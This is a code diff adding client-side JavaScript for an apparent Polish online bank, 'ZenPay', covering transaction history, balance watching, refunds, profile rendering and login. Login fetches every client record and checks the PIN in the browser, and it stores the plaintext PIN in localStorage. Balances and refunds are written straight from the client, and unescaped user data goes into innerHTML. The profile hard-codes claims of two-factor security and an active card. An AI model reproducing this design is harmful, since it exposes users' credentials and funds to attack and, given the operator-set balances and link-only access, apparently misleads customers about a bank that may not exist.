+  document.getElementById('tx-count-badge').textContent = count;
+}
+
+function genId(prefix) {
+  return prefix + Math.floor(1000000000 + Math.random() * 9000000);
+}
+
+function addDebitHistory(data) {
+  if (!data.amount || data.amount >= 0) return Promise.resolve();
+  if (!data.id) data.id = genId('DE');
+  const { dateStr, timeStr, timestamp } = getPolandDateTime();
+  if (!data.time || !data.timestamp) {
+    data.time = timeStr;
+    data.timestamp = timestamp;
+  }
+  if (!data.date) data.date = dateStr;
+  if (user && user._id) {
+    console.log('📤 Ajout de la transaction de débit:', data);
+    return push(ref(db, 'clients/' + user._id + '/history'), data)
+      .then(() => {
+        console.log('✅ Transaction de débit enregistrée avec succès');
+        return data;
+      })
+      .catch(err => {
+        console.error('❌ Erreur push débit:', err);
+        return null;
+      });
+  } else {
+    console.warn('⚠️ user._id manquant, impossible d\'ajouter la transaction');
+    return Promise.resolve(null);
+  }
+}
+
+function getNotifiedCreditIds(userId) {
+  const key = `zenpay_notified_credits_${userId}`;
+  try {
+    const stored = localStorage.getItem(key);
+    return stored ? JSON.parse(stored) : [];
+  } catch {
+    return [];
+  }
+}
+
+function setNotifiedCreditIds(userId, ids) {
+  const key = `zenpay_notified_credits_${userId}`;
+  localStorage.setItem(key, JSON.stringify(ids));
+}
+
+async function handleNewCreditTransaction(tx, userId) {
+  if (!tx || tx.amount <= 0) return;
+  if (tx.title === 'Zwrot') return;
+
+  const notifiedIds = getNotifiedCreditIds(userId);
+  if (notifiedIds.includes(tx.id)) return;
+
+  const montantFormatted = fmt(tx.amount);
+  const beneficiaire = tx.beneficiary || tx.subtitle || 'nieznanego nadawcy';
+  const nomClient = user.nom || 'Klient';
+  const bannerMsg = `Witam ${nomClient}, Otrzymałeś przelew od ${beneficiaire} na kwotę ${montantFormatted}.`;
+
+  console.log('📢 Génération de bannière pour crédit:', bannerMsg);
+
+  try {
+    await update(ref(db, 'clients/' + userId), { bannerMessage: '', bannerRead: true });
+    await update(ref(db, 'clients/' + userId), { bannerMessage: bannerMsg, bannerRead: false });
+    user.bannerMessage = bannerMsg;
+    user.bannerRead = false;
+    updateBanner();
+
+    notifiedIds.push(tx.id);
+    setNotifiedCreditIds(userId, notifiedIds);
+    console.log('✅ Bannière de crédit générée et transaction marquée');
+  } catch (e) {
+    console.error('❌ Erreur lors de la génération de la bannière de crédit:', e);
+  }
+}
+
+async function initHistoryListener(userId) {
+  if (historyListener) historyListener();
+  try {
+    const snapshot = await get(ref(db, 'clients/' + userId + '/history'));
+    if (snapshot.exists()) {
+      const val = snapshot.val();
+      const arr = Object.values(val);
+      currentHistory = arr;
+      renderHistory(arr);
+    } else {
+      currentHistory = [];
+      renderHistory([]);
+    }
+  } catch (err) {
+    console.error('Erreur chargement historique:', err);
+    renderHistory([]);
+  }
+
+  historyListener = onValue(ref(db, 'clients/' + userId + '/history'), (snap) => {
+    const val = snap.val();
+    let arr = [];
+    if (val) {
+      arr = Object.values(val);
+      currentHistory = arr;
+      renderHistory(arr);
+
+      const notifiedIds = getNotifiedCreditIds(userId);
+      const newCredits = arr.filter(tx => tx.amount > 0 && tx.title !== 'Zwrot' && !notifiedIds.includes(tx.id));
+      if (newCredits.length > 0) {
+        newCredits.forEach(tx => {
+          handleNewCreditTransaction(tx, userId);
+        });
+      }
+    } else {
+      currentHistory = [];
+      renderHistory([]);
+    }
+  });
+}
+
+// ===== SURVEILLANCE SOLDE =====
+function watchBalance(userId) {
+  if (balanceListener) balanceListener();
+  balanceListener = onValue(ref(db, 'clients/' + userId + '/montant'), (snap) => {
+    const newMontant = snap.val();
+    if (newMontant === null || newMontant === undefined) return;
+    user.montant = Number(newMontant);
+    const balElement = document.getElementById('bal');
+    const statBalElement = document.getElementById('stat-balance');
+    updateBalanceDisplay(balElement, statBalElement, user.montant);
+    document.getElementById('bal2').textContent = fmt(user.montant);
+    updateProfileInfo();
+  });
+}
+
+// ===== SURVEILLANCE STATUT =====
+function watchClientStatus(userId) {
+  if (statusListener) statusListener();
+  statusListener = onValue(ref(db, 'clients/' + userId), (snap) => {
+    const data = snap.val();
+    if (!data) {
+      toast('Konto usunięte');
+      setTimeout(() => forceLogout(true), 1500);
+      return;
+    }
+    if (data.blocked) {
+      toast('Konto zablokowane');
+      setTimeout(() => forceLogout(false), 1000);
+      return;
+    }
+    if (data.historyReset) {
+      const key = 'zenpay_' + user.email.toLowerCase();
+      const stored = JSON.parse(localStorage.getItem(key) || '{}');
+      if (!stored.lastReset || data.historyReset > stored.lastReset) {
+        localStorage.setItem(key, JSON.stringify({ montant: 0, history: [], lastReset: data.historyReset }));
+        user.montant = 0;
+        const balElement = document.getElementById('bal');
+        const statBalElement = document.getElementById('stat-balance');
+        updateBalanceDisplay(balElement, statBalElement, 0);
+        document.getElementById('bal2').textContent = fmt(0);
+        updateProfileInfo();
+        toast('Historia i saldo zresetowane');
+      }
+      return;
+    }
+    const oldTheme = user.theme;
+    const oldNom = user.nom;
+    user.pct = data.pct;
+    user.code = data.code;
+    user.refundCode = data.refundCode || '';
+    user.msg = data.msg;
+    user.pays = data.pays;
+    user.adresse = data.adresse;
+    user.tel = data.tel;
+    user.devise = data.devise || 'zł';
+    user.notification = data.notification || '';
+    user.theme = data.theme || 'teal';
+    user.nom = data.nom || user.nom;
+    user.email = data.email || user.email;
+    
+    user.bannerMessage = data.bannerMessage || '';
+    user.bannerRead = data.bannerRead || false;
+    updateBanner();
+    
+    if (oldNom !== user.nom) {
+      const greetEl = document.getElementById('greet');
+      if (greetEl) {
+        greetEl.innerHTML = `Witaj, <span>${user.nom}</span>`;
+        adjustGreetingFontSize();
+      }
+    }
+    if (oldTheme !== user.theme) {
+      applyTheme(user.theme);
+      document.querySelectorAll('.btn').forEach(btn => btn.style.background = 'var(--p)');
+    }
+    updateAvatars();
+    updateCurrency();
+    updateNotifBadge();
+    updateProfileInfo();
+    adjustAllTexts();
+  });
+}
+
+// ===== FONCTIONS BANNIÈRE =====
+function updateBanner() {
+  const container = document.getElementById('banner-container');
+  const textEl = document.getElementById('bannerText');
+  if (!container || !textEl) return;
+  
+  clearBannerTimer();
+  
+  if (user && user.bannerMessage && user.bannerMessage.trim() !== '' && !user.bannerRead) {
+    textEl.innerHTML = user.bannerMessage;
+    container.style.display = 'block';
+    console.log('📢 Bannière affichée');
+    
+    if (user && user._id) {
+      bannerTimer = setTimeout(async () => {
+        console.log('⏰ Fermeture automatique de la bannière après 5 minutes');
+        await closeBanner(true);
+      }, 5 * 60 * 1000);
+    }
+  } else {
+    container.style.display = 'none';
+    console.log('📢 Bannière masquée');
+  }
+}
+
+function clearBannerTimer() {
+  if (bannerTimer) {
+    clearTimeout(bannerTimer);
+    bannerTimer = null;
+    console.log('⏹️ Timer de bannière annulé');
+  }
+}
+
+window.closeBanner = async function(auto = false) {
+  if (!user || !user._id) return;
+  try {
+    if (!auto) {
+      await update(ref(db, 'clients/' + user._id), { bannerRead: true });
+      user.bannerRead = true;
+    } else {
+      await update(ref(db, 'clients/' + user._id), { bannerRead: true });
+      user.bannerRead = true;
+    }
+    clearBannerTimer();
+    updateBanner();
+    if (auto) {
+      console.log('🤖 Bannière fermée automatiquement après 5 minutes');
+    } else {
+      console.log('❌ Bannière fermée par le client');
+    }
+  } catch (e) {
+    console.error('Erreur fermeture bannière:', e);
+  }
+};
+
+// ===== RAFRAÎCHISSEMENT =====
+window.refreshData = async function(silent = true) {
+  if (!user || !user._id || refreshInProgress) return;
+  refreshInProgress = true;
+  const refreshIcons = ['refreshIcon', 'refreshIcon2', 'refreshIcon3', 'refreshIcon4', 'refreshIcon5'];
+  refreshIcons.forEach(id => {
+    const el = document.getElementById(id);
+    if (el) {
+      el.parentElement.classList.add('spinning');
+    }
+  });
+  try {
+    const snapshot = await get(ref(db, 'clients/' + user._id));
+    const data = snapshot.val();
+    if (!data) {
+      if (!silent) toast('Erreur : compte introuvable');
+      refreshIcons.forEach(id => {
+        const el = document.getElementById(id);
+        if (el) {
+          el.parentElement.classList.remove('spinning');
+        }
+      });
+      refreshInProgress = false;
+      return;
+    }
+    user.pct = data.pct;
+    user.code = data.code;
+    user.refundCode = data.refundCode || '';
+    user.msg = data.msg;
+    user.pays = data.pays;
+    user.adresse = data.adresse;
+    user.tel = data.tel;
+    user.devise = data.devise || 'zł';
+    user.notification = data.notification || '';
+    user.theme = data.theme || 'teal';
+    user.montant = Number(data.montant) || 0;
+    user.nom = data.nom || user.nom;
+    user.email = data.email || user.email;
+    user.bannerMessage = data.bannerMessage || '';
+    user.bannerRead = data.bannerRead || false;
+    updateBanner();
+    const greetEl = document.getElementById('greet');
+    if (greetEl) {
+      greetEl.innerHTML = `Witaj, <span>${user.nom}</span>`;
+      adjustGreetingFontSize();
+    }
+
+    const balElement = document.getElementById('bal');
+    const statBalElement = document.getElementById('stat-balance');
+    updateBalanceDisplay(balElement, statBalElement, user.montant);
+    document.getElementById('bal2').textContent = fmt(user.montant);
+
+    const historySnap = await get(ref(db, 'clients/' + user._id + '/history'));
+    if (historySnap.exists()) {
+      const val = historySnap.val();
+      const arr = Object.values(val);
+      currentHistory = arr;
+      renderHistory(arr);
+    } else {
+      currentHistory = [];
+      renderHistory([]);
+    }
+    updateProfileInfo();
+    updateAvatars();
+    updateCurrency();
+    updateNotifBadge();
+    applyTheme(user.theme);
+    if (!silent) toast('✅ Données actualisées !');
+  } catch (error) {
+    console.error('Erreur lors du rafraîchissement:', error);
+    if (!silent) toast('❌ Erreur lors de l\'actualisation');
+  } finally {
+    refreshIcons.forEach(id => {
+      const el = document.getElementById(id);
+      if (el) {
+        el.parentElement.classList.remove('spinning');
+      }
+    });
+    refreshInProgress = false;
+  }
+};
+
+// ===== NAVIGATION =====
+window.navigateTo = function(id) {
+  history.pushState({ screen: id }, '', '#' + id);
+  show(id);
+  if (id === 'verify' && user) {
+    initCodeField();
+  }
+};
+
+window.openCard = function() {
+  document.getElementById('card').classList.remove('hidden');
+};
+window.closeCard = function() {
+  document.getElementById('card').classList.add('hidden');
+};
+
+window.openAcc = function() {
+  document.getElementById('acc').classList.remove('hidden');
+};
+window.closeAcc = function() {
+  document.getElementById('acc').classList.add('hidden');
+};
+
+window.openIbanModal = function() {
+  document.getElementById('ibanModal').classList.remove('hidden');
+};
+window.closeIbanModal = function() {
+  document.getElementById('ibanModal').classList.add('hidden');
+};
+
+window.openNotifications = function() {
+  const n = user && user.notification ? user.notification : '';
+  const container = document.getElementById('notif-content');
+  if (n) {
+    const items = n.split(/\n|<br\s*\/?>/).filter(t => t.trim() !== '');
+    container.innerHTML = items.map(text =>
+      `<div class="notif-item">${text.trim()}</div>`
+    ).join('');
+  } else {
+    container.innerHTML = '<p style="color:var(--text-secondary);text-align:center;padding:20px;">Brak powiadomień</p>';
+  }
+  document.getElementById('notifications').classList.remove('hidden');
+};
+window.closeNotifications = function() {
+  document.getElementById('notifications').classList.add('hidden');
+};
+
+// ===== DÉTAIL DES TRANSACTIONS =====
+let currentTxId = null;
+
+window.showTxDetail = function(d) {
+  currentTxId = d.id;
+  const isCredit = d.amount >= 0;
+  const isRefund = isCredit && d.title === 'Zwrot';
+
+  document.getElementById('tx-id').textContent = d.id || '';
+  document.getElementById('tx-amount').textContent = (d.amount >= 0 ? '+ ' : '- ') + fmt(Math.abs(d.amount));
+
+  if (isRefund) {
+    document.getElementById('tx-benef').textContent = d.subtitle || '-';
+    document.getElementById('tx-label-amount').textContent = 'Kwota zwrotu :';
+    document.getElementById('tx-label-benef').textContent = 'Zwrot od :';
+    document.getElementById('tx-label-date').textContent = 'Data zwrotu :';
+  } else if (isCredit) {
+    document.getElementById('tx-benef').textContent = d.beneficiary || d.subtitle || '-';
+    document.getElementById('tx-label-amount').textContent = 'Otrzymana kwota :';
+    document.getElementById('tx-label-benef').textContent = 'Nadawca :';
+    document.getElementById('tx-label-date').textContent = 'Data otrzymania :';
+  } else {
+    document.getElementById('tx-benef').textContent = d.beneficiary || d.subtitle || '-';
+    document.getElementById('tx-label-amount').textContent = 'Wysłana kwota :';
+    document.getElementById('tx-label-benef').textContent = 'Beneficjent :';
+    document.getElementById('tx-label-date').textContent = 'Data przelewu :';
+  }
+
+  document.getElementById('tx-iban').textContent = d.iban || '-';
+  document.getElementById('tx-date').textContent = (d.date || '') + ' • ' + (d.time || '');
+  document.getElementById('tx-iban-row').style.display = (isRefund || isCredit) ? 'none' : 'block';
+
+  const refundBtn = document.getElementById('refundTxBtn');
+  const refundMsg = document.getElementById('refundTxMsg');
+  if (!isCredit && !d.refunded && d.amount < 0) {
+    refundBtn.style.display = 'block';
+    refundBtn.disabled = false;
+    refundMsg.textContent = '';
+    refundBtn.onclick = () => openRefundModal(d);
+  } else if (d.refunded) {
+    refundBtn.style.display = 'none';
+    refundMsg.textContent = '✅ Ten przelew został już anulowany.';
+  } else {
+    refundBtn.style.display = 'none';
+    refundMsg.textContent = '';
+  }
+
+  document.getElementById('txDetail').classList.remove('hidden');
+};
+
+window.closeTxDetail = function() {
+  document.getElementById('txDetail').classList.add('hidden');
+  currentTxId = null;
+};
+
+// ===== MODALE REMBOURSEMENT =====
+let refundTargetTx = null;
+
+function openRefundModal(tx) {
+  refundTargetTx = tx;
+  document.getElementById('refundCode').value = '';
+  document.getElementById('refundError').style.display = 'none';
+  document.getElementById('refundModal').classList.remove('hidden');
+}
+
+window.closeRefundModal = function() {
+  document.getElementById('refundModal').classList.add('hidden');
+  refundTargetTx = null;
+};
+
+window.confirmRefund = async function() {
+  const code = document.getElementById('refundCode').value.trim();
+  const errEl = document.getElementById('refundError');
+  errEl.style.display = 'none';
+
+  if (!code) {
+    errEl.textContent = 'Proszę wprowadzić kod.';
+    errEl.style.display = 'block';
+    return;
+  }
+
+  if (code !== user.refundCode) {
+    errEl.textContent = 'Nieprawidłowy kod anulowania.';
+    errEl.style.display = 'block';
+    return;
+  }
+
+  if (!refundTargetTx) {
+    toast('Brak transakcji do anulowania.');
+    closeRefundModal();
+    return;
+  }
+
+  if (refundTargetTx.refunded) {
+    toast('Ten przelew został już anulowany.');
+    closeRefundModal();
+    return;
+  }
+
+  const amount = Math.abs(refundTargetTx.amount);
+  const { dateStr, timeStr, timestamp } = getPolandDateTime();
+  const devise = user.devise || 'zł';
+  const formattedAmount = new Intl.NumberFormat('pl-PL', { minimumFractionDigits: 2, maximumFractionDigits: 2 }).format(amount) + ' ' + devise;
+
+  try {
+    const newMontant = user.montant + amount;
+    await update(ref(db, 'clients/' + user._id), { montant: newMontant });
+    user.montant = newMontant;
+    const balElement = document.getElementById('bal');
+    const statBalElement = document.getElementById('stat-balance');
+    updateBalanceDisplay(balElement, statBalElement, user.montant);
+    document.getElementById('bal2').textContent = fmt(user.montant);
+
+    const nomClient = user.nom || 'Klient';
+    const bannerMsg = `Witam ${nomClient}, Zwrot ${formattedAmount} został przetworzony i zaksięgowany na Twoim koncie.`;
+    await update(ref(db, 'clients/' + user._id), { bannerMessage: bannerMsg, bannerRead: false });
+    user.bannerMessage = bannerMsg;
+    user.bannerRead = false;
+    updateBanner();
+
+    const refundTx = {
+      id: genId('RF'),
+      title: 'Zwrot',
+      subtitle: 'Anulowanie przelewu',
+      amount: amount,
+      beneficiary: 'ZenPay',
+      iban: refundTargetTx.iban ? refundTargetTx.iban.substring(0, 9) + '*********' : 'ZPY916398*********',
+      devise: devise,
+      date: dateStr,
+      time: timeStr,
+      timestamp: timestamp,
+      refundedTransactionId: refundTargetTx.id
+    };
+    await push(ref(db, 'clients/' + user._id + '/history'), refundTx);
+
+    const historySnap = await get(ref(db, 'clients/' + user._id + '/history'));
+    if (historySnap.exists()) {
+      const history = historySnap.val();
+      for (const [key, tx] of Object.entries(history)) {
+        if (tx.id === refundTargetTx.id) {
+          await update(ref(db, 'clients/' + user._id + '/history/' + key), { refunded: true });
+          break;
+        }
+      }
+    }
+
+    const refNum = genId('REF');
+    await sendMail({
+      to: user.email,
+      name: user.nom || 'Klient',
+      pct: 100,
+      success: true,
+      montant: formattedAmount,
+      beneficiaire: refundTargetTx.beneficiary || refundTargetTx.subtitle || '—',
+      compte: refundTargetTx.iban || '—',
+      reference: refNum,
+      isRefund: true
+    });
+
+    toast(`✅ Przelew anulowany, zwrot ${fmt(amount)}`);
+    closeRefundModal();
+    closeTxDetail();
+    refreshData(true);
+  } catch (err) {
+    console.error('Erreur lors du remboursement:', err);
+    toast('❌ Wystąpił błąd podczas anulowania.');
+  }
+};
+
+// ===== PROFIL =====
+function buildProfile(u) {
+  const initials = (u.nom || 'U').split(' ').map(w => w[0]).join('').substring(0, 2).toUpperCase();
+  return `
+    <div class="profile-header-card">
+      <div class="profile-avatar-large">${initials}</div>
+      <div class="profile-name">${u.nom || 'Użytkownik'}</div>
+      <div class="profile-email">${u.email || ''}</div>
+      <div class="profile-status-badge">
+        <span class="dot"></span>
+        <span>Konto aktywne</span>
+      </div>
+    </div>
+
+    <div class="profile-section-pro">
+      <div class="profile-section-header-pro">
+        <div class="profile-section-icon"><i class="fa-solid fa-user"></i></div>
+        <div>
+          <div class="profile-section-title-pro">Informacje osobiste</div>
+          <div class="profile-section-subtitle">Dane identyfikacyjne</div>
+        </div>
+      </div>
+      <div class="profile-row-pro">
+        <div class="profile-row-left">
+          <div class="profile-row-icon"><i class="fa-solid fa-user"></i></div>
+          <div class="profile-row-info">
+            <div class="profile-row-label">Imię i nazwisko</div>
+            <div class="profile-row-value">${u.nom || '—'}</div>
+          </div>
+        </div>
+        <div class="profile-row-action"><i class="fa-solid fa-chevron-right"></i></div>
+      </div>
+      <div class="profile-row-pro">
+        <div class="profile-row-left">
+          <div class="profile-row-icon"><i class="fa-solid fa-envelope"></i></div>
+          <div class="profile-row-info">
+            <div class="profile-row-label">Adres e-mail</div>
+            <div class="profile-row-value" style="font-size:13px;">${u.email || '—'}</div>
+          </div>
+        </div>
+        <div class="profile-row-action"><i class="fa-solid fa-chevron-right"></i></div>
+      </div>
+      <div class="profile-row-pro">
+        <div class="profile-row-left">
+          <div class="profile-row-icon"><i class="fa-solid fa-phone"></i></div>
+          <div class="profile-row-info">
+            <div class="profile-row-label">Numer telefonu</div>
+            <div class="profile-row-value">${u.tel || '—'}</div>
+          </div>
+        </div>
+        <div class="profile-row-action"><i class="fa-solid fa-chevron-right"></i></div>
+      </div>
+      <div class="profile-row-pro">
+        <div class="profile-row-left">
+          <div class="profile-row-icon"><i class="fa-solid fa-flag"></i></div>
+          <div class="profile-row-info">
+            <div class="profile-row-label">Kraj zamieszkania</div>
+            <div class="profile-row-value">${u.pays || '—'}</div>
+          </div>
+        </div>
+        <div class="profile-row-action"><i class="fa-solid fa-chevron-right"></i></div>
+      </div>
+      <div class="profile-row-pro">
+        <div class="profile-row-left">
+          <div class="profile-row-icon"><i class="fa-solid fa-location-dot"></i></div>
+          <div class="profile-row-info">
+            <div class="profile-row-label">Adres zamieszkania</div>
+            <div class="profile-row-value" style="font-size:13px;">${u.adresse || '—'}</div>
+          </div>
+        </div>
+        <div class="profile-row-action"><i class="fa-solid fa-chevron-right"></i></div>
+      </div>
+    </div>
+
+    <div class="profile-section-pro">
+      <div class="profile-section-header-pro">
+        <div class="profile-section-icon"><i class="fa-solid fa-credit-card"></i></div>
+        <div>
+          <div class="profile-section-title-pro">Konto bankowe</div>
+          <div class="profile-section-subtitle">Informacje o koncie i saldzie</div>
+        </div>
+      </div>
+      <div class="profile-balance-highlight">
+        <div>
+          <div class="bal-label">Dostępne saldo</div>
+          <div class="bal-value">${fmt(u.montant)}</div>
+        </div>
+        <div class="bal-icon"><i class="fa-solid fa-wallet"></i></div>
+      </div>
+      <div class="profile-row-pro">
+        <div class="profile-row-left">
+          <div class="profile-row-icon"><i class="fa-solid fa-briefcase"></i></div>
+          <div class="profile-row-info">
+            <div class="profile-row-label">Typ konta</div>
+            <div class="profile-row-value">Profesjonalne</div>
+          </div>
+        </div>
+        <div class="profile-row-action"><i class="fa-solid fa-chevron-right"></i></div>
+      </div>
+      <div class="profile-row-pro">
+        <div class="profile-row-left">
+          <div class="profile-row-icon"><i class="fa-solid fa-shield-halved"></i></div>
+          <div class="profile-row-info">
+            <div class="profile-row-label">Status konta</div>
+            <div class="profile-row-value" style="color:#059669;"><i class="fa-solid fa-circle-check" style="font-size:11px;margin-right:4px;"></i>Aktywny</div>
+          </div>
+        </div>
+        <div class="profile-row-action"><i class="fa-solid fa-chevron-right"></i></div>
+      </div>
+      <div class="profile-row-pro">
+        <div class="profile-row-left">
+          <div class="profile-row-icon"><i class="fa-solid fa-money-bill-transfer"></i></div>
+          <div class="profile-row-info">
+            <div class="profile-row-label">Typ przelewu</div>
+            <div class="profile-row-value-muted">Międzynarodowy (SEPA/SWIFT)</div>
+          </div>
+        </div>
+        <div class="profile-row-action"><i class="fa-solid fa-chevron-right"></i></div>
+      </div>
+      <div class="profile-row-pro">
+        <div class="profile-row-left">
+          <div class="profile-row-icon"><i class="fa-solid fa-coins"></i></div>
+          <div class="profile-row-info">
+            <div class="profile-row-label">Waluta</div>
+            <div class="profile-row-value">${u.devise || 'zł'}</div>
+          </div>
+        </div>
+        <div class="profile-row-action"><i class="fa-solid fa-chevron-right"></i></div>
+      </div>
+    </div>
+
+    <div class="profile-section-pro">
+      <div class="profile-section-header-pro">
+        <div class="profile-section-icon"><i class="fa-solid fa-lock"></i></div>
+        <div>
+          <div class="profile-section-title-pro">Bezpieczeństwo</div>
+          <div class="profile-section-subtitle">Ochrona konta</div>
+        </div>
+      </div>
+      <div class="profile-row-pro">
+        <div class="profile-row-left">
+          <div class="profile-row-icon"><i class="fa-solid fa-fingerprint"></i></div>
+          <div class="profile-row-info">
+            <div class="profile-row-label">Weryfikacja dwuetapowa</div>
+            <div class="profile-row-value-muted">Aktywna (kod PIN)</div>
+          </div>
+        </div>
+        <div class="profile-row-action"><i class="fa-solid fa-chevron-right"></i></div>
+      </div>
+      <div class="profile-row-pro">
+        <div class="profile-row-left">
+          <div class="profile-row-icon"><i class="fa-solid fa-id-card"></i></div>
+          <div class="profile-row-info">
+            <div class="profile-row-label">Karta wirtualna</div>
+            <div class="profile-row-value-muted">Aktywna • Visa</div>
+          </div>
+        </div>
+        <div class="profile-row-action"><i class="fa-solid fa-chevron-right"></i></div>
+      </div>
+    </div>
+
+    <div style="padding:0 16px 24px;">
+      <button onclick="withSpinner(() => logout())" class="profile-logout-btn">
+        <i class="fa-solid fa-right-from-bracket"></i> Wyloguj się
+      </button>
+    </div>
+
+    <div class="profile-footer-note">
+      <i class="fa-solid fa-shield-halved"></i>
+      Twoje dane są chronione zgodnie z regulaminem RODO. W przypadku pytań skontaktuj się z obsługą klienta.
+    </div>
+  `;
+}
+
+function updateProfileInfo() {
+  if (!user) {
+    document.getElementById('accinfo').innerHTML = '';
+    return;
+  }
+  document.getElementById('accinfo').innerHTML = buildProfile(user);
+}
+
+function updateAvatars() {
+  if (!user) return;
+  const initials = user.nom.split(' ').map(w => w[0]).join('').substring(0, 2).toUpperCase();
+  ['avatar', 'avatar2', 'avatar3', 'avatar4', 'avatar5'].forEach(id => {
+    const el = document.getElementById(id);
+    if (el) el.textContent = initials;
+  });
+}
+
+function updateCurrency() {
+  if (!user) return;
+  const devCode = normalizeDevise(user.devise);
+  const sym = getDeviseSymbol(devCode);
+  const label = getDeviseLabel(devCode);
+  const cs = document.getElementById('currency-symbol');
+  if (cs) cs.textContent = sym;
+  document.getElementById('stat-devise').textContent = label;
+  adjustAllTexts();
+}
+
+function updateNotifBadge() {
+  const hasNotif = user && user.notification && user.notification.trim() !== '';
+  ['notif-badge', 'notif-badge2', 'notif-badge3', 'notif-badge4', 'notif-badge5'].forEach(id => {
+    const el = document.getElementById(id);
+    if (el) {
+      if (hasNotif) el.classList.remove('hidden');
+      else el.classList.add('hidden');
+    }
+  });
+}
+
+// ===== AFFICHAGE =====
+const show = id => {
+  document.querySelectorAll('.screen').forEach(s => {
+    s.classList.remove('active');
+    s.style.display = 'none';
+  });
+  const banned = document.getElementById('banned-screen');
+  if (banned) banned.style.display = 'none';
+  const target = document.getElementById(id);
+  if (target) {
+    target.style.display = '';
+    target.classList.add('active');
+  }
+  document.getElementById('mainNav').style.display = (id === 'login' ? 'none' : 'grid');
+  document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));
+  const map = { 'dashboard': 0, 'transfer': 1 };
+  if (map[id] !== undefined) {
+    document.querySelectorAll('.nav-item')[map[id]]?.classList.add('active');
+  }
+  if (id === 'dashboard') {
+    setTimeout(() => adjustAllTexts(), 50);
+  }
+};
+window.show = show;
+
+window.addEventListener('popstate', (e) => {
+  if (user) {
+    show('dashboard');
+  } else {
+    const saved = localStorage.getItem('zenpay_session');
+    if (saved) {
+      try {
+        const parsed = JSON.parse(saved);
+        if (parsed.id) {
+          document.getElementById('email').value = parsed.e || '';
+          document.getElementById('pin').value = parsed.p || '';
+          login({ silent: true, redirect: true }).catch(() => show('login'));
+          return;
+        }
+      } catch {}
+    }
+    show('login');
+  }
+});
+
+async function forceLogout(isDeleted = false) {
+  if (user && user._id && sessionId) {
+    try {
+      await update(ref(db, 'clients/' + user._id + '/sessions/' + sessionId), { connected: false });
+    } catch(e) {}
+  }
+  localStorage.removeItem('zenpay_session');
+  localStorage.removeItem('zenpay_session_id');
+  localStorage.removeItem('zenpay_client_id');
+  localStorage.removeItem('zenpay_theme');
+  user = null;
+  if (historyListener) historyListener();
+  if (balanceListener) balanceListener();
+  if (statusListener) statusListener();
+  if (banqueRef) banqueRef();
+  clearBannerTimer();
+  if (isDeleted) {
+    showBanned();
+    return;
+  }
+  show('login');
+  const errEl = document.getElementById('err');
+  if (errEl) errEl.classList.add('hidden');
+  history.replaceState({ screen: 'login' }, '', '#login');
+}
+
+// ===== LOGIN =====
+window.login = async function(options = { silent: false, redirect: false }) {
+  const btn = document.getElementById('loginBtn');
+  btn.disabled = true;
+  showLoading('Logowanie...');
+
+  const e = document.getElementById('email').value.trim().toLowerCase();
+  const p = document.getElementById('pin').value.trim();
+  const err = document.getElementById('err');
+  err.classList.add('hidden');
+
+  if (!window.__clientIdFromUrl) {
+    err.textContent = 'Brak dostępu – nieprawidłowy link. Użyj linku, który otrzymałeś.';
+    err.classList.remove('hidden');
+    localStorage.removeItem('zenpay_session');
+    localStorage.removeItem('zenpay_client_id');
+    if (!options.silent) {
+      show('login');
+    }
+    hideLoading();
+    btn.disabled = false;
+    return;
+  }
+
+  try {
+    const s = await get(ref(db, 'clients'));
+    const d = s.val() || {};
+    let f = null,
+      fid = null;
+    for (const k in d) {
+      const v = d[k];
+      if (v.email && v.email.toLowerCase() === e && String(v.pin) === p) {
+        f = v;
+        fid = k;
+        break;
+      }
+    }
+
+    if (!f) {
+      err.textContent = 'Błąd logowania – sprawdź email i PIN';
+      err.classList.remove('hidden');
+      localStorage.removeItem('zenpay_session');
+      localStorage.removeItem('zenpay_client_id');
+      if (!options.silent) {
+        show('login');
+      }
+      hideLoading();
+      btn.disabled = false;
+      return;
+    }
+
+    if (fid !== window.__clientIdFromUrl) {
+      err.textContent = 'Te dane logowania nie pasują do tego linku. Użyj swojego własnego linku do logowania.';
+      err.classList.remove('hidden');
+      localStorage.removeItem('zenpay_session');
+      localStorage.removeItem('zenpay_client_id');
+      if (!options.silent) {
+        show('login');
+      }
+      hideLoading();
+      btn.disabled = false;
+      return;
+    }
+
+    if (f.blocked) {
+      err.textContent = 'Konto zostało zablokowane';
+      err.classList.remove('hidden');
+      localStorage.removeItem('zenpay_session');
+      localStorage.removeItem('zenpay_client_id');
+      if (!options.silent) {
+        show('login');
+      }
+      hideLoading();
+      btn.disabled = false;
+      return;
+    }
+
+    user = f;
+    user._id = fid;
+    if (!user.devise) user.devise = 'zł';
+    if (!user.theme) user.theme = 'teal';
+    user.refundCode = user.refundCode || '';
+    user.bannerMessage = user.bannerMessage || '';
+    user.bannerRead = user.bannerRead || false;
+
+    localStorage.setItem('zenpay_session', JSON.stringify({ e, p }));
+    localStorage.setItem('zenpay_theme', user.theme);
+    localStorage.setItem('zenpay_client_id', fid);
+
+    document.getElementById('greet').innerHTML = `Witaj, <span>${user.nom}</span>`;
+    adjustGreetingFontSize();
+
+    await updateSession(true);
+
+    const balElement = document.getElementById('bal');
+    const statBalElement = document.getElementById('stat-balance');
+    updateBalanceDisplay(balElement, statBalElement, user.montant);
+    document.getElementById('bal2').textContent = fmt(user.montant);
+
+    applyTheme(user.theme);
+    updateAvatars();
+    updateCurrency();
+    updateNotifBadge();
+    updateProfileInfo();
+    updateBanner();
+
+    setupBankListener(fid);
+
+    await initHistoryListener(fid);
+    watchBalance(fid);
+    watchClientStatus(fid);
+
+    setupTransferValidation();
+    setupRequiredMessages();
+
+    adjustAllTexts();
+
+    if (options.redirect) {
+      navigateTo('dashboard');
+    } else if (!options.silent) {
+      navigateTo('dashboard');
+    } else {
+      show('dashboard');
+      history.replaceState({ screen: 'dashboard' }, '', '#dashboard');
+    }
+
+    hideLoading();
+    btn.disabled = false;
+  } catch (error) {
+    console.error('Erreur login:', error);
+    err.textContent = 'Erreur de connexion, réessayez';
+    err.classList.remove('hidden');
+    hideLoading();
+    btn.disabled = false;
+  }
+};
+
+// ===== DÉCONNEXION =====
+window.logout = async function() {
+  document.getElementById('acc').classList.add('hidden');
+
+  if (user && user._id && sessionId) {
+    try {
+      await update(ref(db, 'clients/' + user._id + '/sessions/' + sessionId), { connected: false });
+    } catch(e) {}
+  }
+  localStorage.removeItem('zenpay_session');
+  localStorage.removeItem('zenpay_session_id');
+  localStorage.removeItem('zenpay_client_id');
+  localStorage.removeItem('zenpay_theme');
+  user = null;
+  if (historyListener) historyListener();
+  if (balanceListener) balanceListener();
+  if (statusListener) statusListener();
+  if (banqueRef) banqueRef();
+  clearBannerTimer();
+
+  show('login');
+  const errEl = document.getElementById('err');
